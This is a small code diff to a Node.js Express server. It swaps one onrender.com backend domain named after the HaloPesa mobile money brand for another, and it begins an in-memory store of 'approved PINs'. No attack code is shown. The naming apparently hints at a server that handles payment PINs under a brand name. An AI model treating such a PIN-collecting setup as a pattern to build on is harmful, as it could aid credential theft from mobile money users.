@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_URL || 'https://halopesa-tanzania-x2u7.onrender.com';
+const DOMAIN = process.env.BACKEND_URL || 'https://halopesa-tanzania-1ku8.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 const approvedPins = {};
